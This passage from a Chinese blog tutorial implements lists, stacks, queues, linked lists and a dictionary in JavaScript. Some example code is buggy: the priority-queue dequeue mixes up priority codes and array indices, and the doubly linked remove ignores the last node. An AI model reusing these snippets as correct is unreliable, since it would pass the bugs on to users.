<h2 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">front</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.pos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.pos = <span class="keyword">this</span>.listSize - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prev</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        --<span class="keyword">this</span>.pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.pos &lt; <span class="keyword">this</span>.listSize<span class="number">-1</span>) &#123;</span><br><span class="line">        ++<span class="keyword">this</span>.pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">currPos</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.pos;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveTo</span>(<span class="params">position</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.pos = position;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore[<span class="keyword">this</span>.pos];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用迭代器访问列表"><a href="#使用迭代器访问列表" class="headerlink" title="使用迭代器访问列表"></a>使用迭代器访问列表</h2><p>使用迭代器，可以不必关心数据的内部存储方式，以实现对列表的遍历。前面提到的方法front、end、prev、next和currPos就实现了cList类的一个迭代器。以下是和使用数组索引的方式相比，使用迭代器的一些优点。</p>
<ol>
<li>访问列表元素时不必关心底层的数据存储结构</li>
<li>当为列表添加一个元素时，索引的值就不对了，此时只用更新列表，而不用更新迭代器。</li>
<li>可以用不同类型的数据存储方式实现cList类，迭代器为访问列表里的元素提供了一种统一的方式<br>来看一下使用迭代器遍历列表的例子<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(names.front(); names.currPos() &lt; names.length; names.next()) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(names.getElement());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在for循环的一开始，将列表的当前位置设置为第一个元素。只要currPos的值小于列表的长度，就一直循环，每一次循环都调用next()方法将当前位置向前移动一位。</p>
<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>栈是一种高效的数据结构，因为数据只能在栈顶添加或删除，所以这样的操作很快，而且容易实现。栈的使用遍布程序语言实现的方方面面，从表达式求值到处理函数调用。</p>
<h2 id="对栈的操作"><a href="#对栈的操作" class="headerlink" title="对栈的操作"></a>对栈的操作</h2><p>栈是一种特殊的列表，栈内的元素只能通过列表的一端访问，这一端称为栈顶。栈被称作一种后入先出的数据结构。</p>
<p>对栈的两种主演操作是将一个元素压入栈和将一个元素弹出栈。入栈使用push()方法，出栈使用pop方法。</p>
<p>另一个常用的操作是预览栈顶的元素。pop()方法虽然可以访问栈顶的元素，但是调用该方法后，栈顶元素也从栈中被永久性地删除了。peek()方法则只返回栈顶元素，而不删除它。</p>
<p>为了记录栈顶元素的位置，同时也为了标记哪里可以加入新元素，我们使用变量top,当向栈内压入元素时，该变量增大；从栈内弹出元素时，该变量减小。<br>clear方法清除栈内所有元素，length属性记录栈内元素的个数。我们还定义了一个empty属性，用以表示栈内是否含有元素，不过使用length属性也可以达到同样的目的。</p>
<h2 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h2><p>我们的实现以定义Stack类的构造函数开始：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Stack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.push = push;</span><br><span class="line">    <span class="keyword">this</span>.pop = pop;</span><br><span class="line">    <span class="keyword">this</span>.peek = peek;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>push方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore[<span class="keyword">this</span>.top++] = element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>pop方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore[--<span class="keyword">this</span>.top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>peek方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">peek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore[<span class="keyword">this</span>.top<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>length方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>clear方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-数制间的相互转换"><a href="#使用-数制间的相互转换" class="headerlink" title="使用-数制间的相互转换"></a>使用-数制间的相互转换</h2><p>可以利用栈将一个数字从一种数制转换成另一种数值。假设想将数字n转换为以b为基数的数字，实现转换的算法如下。</p>
<ol>
<li>最高位为n%b,将此位压入栈</li>
<li>使用n/b代替n</li>
<li>重复步骤1和2，直到n等于0，且没有余数</li>
<li>持续将栈内元素弹出，直到栈为空，依次将这些元素排列，就得到转换后数字的字符串形式</li>
</ol>
<p>此算法只针对基数为2-9的情况<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mulBase</span>(<span class="params">num, base</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        s.push(num % base);</span><br><span class="line">        num = <span class="built_in">Math</span>.floor(num /= base);</span><br><span class="line">    &#125; <span class="keyword">while</span> (num &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> converted = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">while</span> (s.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        converted += s.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> converted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-递归演示"><a href="#使用-递归演示" class="headerlink" title="使用-递归演示"></a>使用-递归演示</h2><p>栈常常被用来实现编程语言，使用栈实现递归即为一例。详细讲解如何使用栈来实现递归过程超出了本书范围，这里只用栈来模拟递归过程。<br>下面是一个递归函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(factorial(<span class="number">5</span>));<span class="comment">// 120</span></span><br></pre></td></tr></table></figure></p>
<p>使用栈模拟递归<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fact</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        s.push(n --);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> product = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (s.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        product *= s.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> product;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fact(<span class="number">5</span>));<span class="comment">// 120</span></span><br></pre></td></tr></table></figure></p>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列是一种列表，不同的是队列只能在队尾插入元素，在队首删除元素。队列用于存储按顺序排列的数据，先进先出。</p>
<h2 id="对队列的操作"><a href="#对队列的操作" class="headerlink" title="对队列的操作"></a>对队列的操作</h2><p>插入操作也叫做入队，删除操作也叫做出队。入队操作在队尾插入新元素，出队操作删除队头的元素。</p>
<p>读取队头的元素叫做peek(),该操作返回队头元素，但不把它从队列中删除。length属性说明了队列中存储了多少元素；clear方法用于清空队列中的所有元素。</p>
<h2 id="一个用数组实现的队列"><a href="#一个用数组实现的队列" class="headerlink" title="一个用数组实现的队列"></a>一个用数组实现的队列</h2><p>数组的push方法可以在数组末尾加入元素，shift()方法可删除数组的第一个元素。<br>先实现一个Queue类，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Queue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.enqueue = enqueue;</span><br><span class="line">    <span class="keyword">this</span>.dequeue = dequeue;</span><br><span class="line">    <span class="keyword">this</span>.front = front;</span><br><span class="line">    <span class="keyword">this</span>.back = back;</span><br><span class="line">    <span class="keyword">this</span>.toString = toString;</span><br><span class="line">    <span class="keyword">this</span>.empty = empty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>enqueue()方法向队尾添加一个元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enqueue</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore.push(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>dequeue()方法删除队首的元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dequeue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore.shift();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以使用如下方法读取队首和队尾的元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">front</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore[<span class="keyword">this</span>.dataStore.length<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>toString方法显示队列内的所有元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> retStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        retStr += <span class="keyword">this</span>.dataStore[i] + <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>判读队列是否为空<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">empty</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h2><p>也有一些使用队列的应用，在删除元素时不必遵守先进先出的约定。这种应用，需要使用一个叫做优先队列的数据结构来进行模拟。<br>先来定义存储队列元素的对象，然后再构建我们的优先队列系统：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Patient</span>(<span class="params">name, code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.code = code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在需要重新定义dequeue方法，使其删除队列中拥有最高优先级的元素。我们规定：优先码的值最小的元素优先级最高。新的dequeue方法遍历队列的底层存储数组，从中找出优先码最低的元素，然后使用数组的splice方法删除优先级最高的元素。新的dequeue方法定义如下所示：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dequeue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> priority = <span class="keyword">this</span>.dataStore[<span class="number">0</span>].code;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore[i].code &lt; priority) &#123;</span><br><span class="line">            priority = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore.splice(priority, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="数组的缺点"><a href="#数组的缺点" class="headerlink" title="数组的缺点"></a>数组的缺点</h2><p>数组不总是组织数据的最佳数据结构，原因如下。在很多编程语言中，数组的长度是固定的，所以当数组已被数据填满时，再要加入新的元素就会非常困难。在数组中，添加和删除元素也很麻烦，因为需要将数组中的其他元素向前或向后平移，以反映数组刚刚进行了添加或删除操作。当然，JavaScript的数组并不存在上述问题，因为使用split方法不需要再访问数组中的其他元素了。</p>
<p>JavaScript中数组的主要问题是，它们被实现成了对象，与其他语言（比如C++和Java）的数组相比，效率很低。</p>
<p>如果你发现数组在实际使用时很慢，就可以考虑使用链表来替代它。除了对数据的随机访问，链表几乎可以用在任何可以使用一维数组的情况中。如果需要随机访问，数组仍然是更好的选择。</p>
<h2 id="定义链表"><a href="#定义链表" class="headerlink" title="定义链表"></a>定义链表</h2><p>链表是由一组节点组成的集合。每个节点都使用一个对象的引用指向它的后继，指向另一个节点的引用叫做链。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/2.jpg" alt="avatar"><br>数组元素靠它们的位置进行引用，链表元素则是靠相互之间的关系进行引用。我们说bread跟在milk后面，而不说bread是链表中的第二个元素。遍历链表，就是跟着链接，从链表的首元素一直走到尾元素（但这不包括链表的头节点，头节点常常用来作为链表的接入点）。图中另外一个值得注意的地方是，链表的尾元素指向一个null节点。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/3.jpg" alt="avatar"><br>链表中插入一个节点的效率很高。向链表中插入一个节点，需要修改它前面的节点（前驱），使其指向新加入的节点，而新加入的节点则指向原来前驱指向的节点。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/4.jpg" alt="avatar"><br>从链表中删除一个元素也很简单。将待删除元素的前驱节点指向待删除元素的后继节点，同时将待删除元素指向null，元素就删除成功了。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/5.jpg" alt="avatar"><br>链表还有其他一些操作，但插入和删除元素最能说明链表为什么如此有用。</p>
<h2 id="设计一个基于对象的链表"><a href="#设计一个基于对象的链表" class="headerlink" title="设计一个基于对象的链表"></a>设计一个基于对象的链表</h2><p>我们设计的链表包含两个类。Node类用来表示节点，LinkedList类提供了插入节点、删除节点、显示列表元素的方法，以及其他一些辅助方法。</p>
<h2 id="Node类"><a href="#Node类" class="headerlink" title="Node类"></a>Node类</h2><p>Node类包含两个属性：element用来保存节点上的数据，next用来保存指向下一个节点的链接。我们使用一个构造函数来创建节点，该构造函数设置了这两个属性的值：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.element = element;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="LinkedList类"><a href="#LinkedList类" class="headerlink" title="LinkedList类"></a>LinkedList类</h2><p>LList类提供了对链表进行操作的方法。该类的功能包括插入删除节点、在列表中查找给定的值。该类也有一个构造函数，链表只有一个属性，那就是使用一个Node对象来保存该链表的头节点。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LList</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">"head"</span>);</span><br><span class="line">    <span class="keyword">this</span>.find = find;</span><br><span class="line">    <span class="keyword">this</span>.insert = insert;</span><br><span class="line">    <span class="keyword">this</span>.remove = remove;</span><br><span class="line">    <span class="keyword">this</span>.display = display;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>head节点的next属性被初始化为null，当有新元素插入时，next会指向新的元素，所以在这里我们没有修改next的值</p>
<h2 id="插入新节点"><a href="#插入新节点" class="headerlink" title="插入新节点"></a>插入新节点</h2><p>首先介绍如何在一个一直节点后面插入元素，在一个已知节点后面插入元素时，先要找到“后面”的节点。首先创建一个辅助方法find,该方法遍历链表，查找给定数据。如果找到数据，该方法就返回保存该数据的节点。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">while</span> (currNode.element != item) &#123;</span><br><span class="line">        currNode = currNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> currNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一旦找到“后面”的节点，就可以将新节点插入链表了。首先，将新节点的next属性设置为“后面”节点的next属性对应的值。然后设置“后面”节点的next属性指向新节点。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">newElement, item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newNode = <span class="keyword">new</span> Node(newElement);</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.find(item);</span><br><span class="line">    newNode.next = current.next;</span><br><span class="line">    current.next = newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在定义一个display方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">while</span> (!(currNode.next == <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(currNode.next.element);</span><br><span class="line">        currNode = currNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="从链表中删除一个节点"><a href="#从链表中删除一个节点" class="headerlink" title="从链表中删除一个节点"></a>从链表中删除一个节点</h2><p>从链表中删除节点时，需要先找到待删除节点前面的节点。找到这个节点后，修改它的next属性，使其不再指向待删除节点，而是指向待删除节点的下一个节点。首先定义findPrevious方法：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findPrevious</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">while</span> (!(currNode.next == <span class="literal">null</span>) &amp;&amp; (currNode.next.element != item)) &#123;</span><br><span class="line">        currNode = currNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> currNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>remove方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prevNode = <span class="keyword">this</span>.findPrevious(item);</span><br><span class="line">    <span class="keyword">if</span> (!(prevNode.next == <span class="literal">null</span>)) &#123;</span><br><span class="line">        prevNode.next = prevNode.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p>链表从后向前遍历不容易，双向链表很容易做到，下图演示了双向链表的工作原理<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/6.jpg" alt="avatar"><br>首当其冲的是要为Node类增加一个previous属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.element = element;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.previous = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>insert方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">newElement, item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newNode = <span class="keyword">new</span> Node(newElement);</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.find(item);</span><br><span class="line">    newNode.next = current.next;</span><br><span class="line">    newNode.previous = current;</span><br><span class="line">    current.next = newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>remove方法比单向链表的效率更高，因为不需要再查找前驱节点了。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/7.jpg" alt="avatar"><br>remove方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.find(item);</span><br><span class="line">    <span class="keyword">if</span> (!(currNode.next == <span class="literal">null</span>)) &#123;</span><br><span class="line">        currNode.previous.next = currNode.next;</span><br><span class="line">        currNode.next.previous = currNode.previous;</span><br><span class="line">        currNode.next = <span class="literal">null</span>;</span><br><span class="line">        currNode.previous = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为了完成以反序显示链表中元素这类任务，findLast方法找出了链表中的最后一个节点<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findLast</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">while</span> (!(currNode.next == <span class="literal">null</span>)) &#123;</span><br><span class="line">        currNode = currNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> currNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>反序显示链表中元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dispReverse</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    currNode = <span class="keyword">this</span>.findLast();</span><br><span class="line">    <span class="keyword">while</span> (!(currNode.previous == <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(currNode.element);</span><br><span class="line">        currNode = currNode.previous;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>循环链表和单向链表相似，唯一的区别是，让其头节点的next属性指向它本身<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">head.next = head</span><br></pre></td></tr></table></figure></p>
<p>这种行为会传导至链表中的每个节点，使得每个节点的next属性都指向链表的头节点，换句话说。链表的尾节点指向头节点，形成了一个循环链表<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/8.jpg" alt="avatar"><br>修改LList类的构造函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LList</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">"head"</span>);</span><br><span class="line">    <span class="keyword">this</span>.head.next = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">this</span>.find = find;</span><br><span class="line">    <span class="keyword">this</span>.insert = insert;</span><br><span class="line">    <span class="keyword">this</span>.display = display;</span><br><span class="line">    <span class="keyword">this</span>.findPrevious = findPrevious;</span><br><span class="line">    <span class="keyword">this</span>.remove = remove;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>只需要修改一处，就将单向链表变成循环链表。其他方法也需要做一下修改，比如display<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> currNode = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">while</span> (!(currNode.next == <span class="literal">null</span>) &amp;&amp; !(currNode.next.element == <span class="string">"head"</span>)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(currNode.next.element);</span><br><span class="line">        currNode = currNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="链表的其他方法"><a href="#链表的其他方法" class="headerlink" title="链表的其他方法"></a>链表的其他方法</h2><p>advance(n)<br>在链表中向前移动n个节点<br>back(n)<br>在双向链表中向后移动n个节点<br>show()<br>只显示当前节点</p>
<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>字典是一种以键-值对形式存储数据的数据结构，JavaScript的Object类就是以字典的形式设计的。</p>
<h2 id="Dictionary类"><a href="#Dictionary类" class="headerlink" title="Dictionary类"></a>Dictionary类</h2><p>Dictionary类的基础是Array类，而不是Object类。我们相对字典中的键排序，而JavaScript中是不能对对象的属性进行排序的。但是不要忘记，JavaScript中一切皆对象，数组也是对象。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dictionary</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.datastore = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>add方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.datastore[key] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
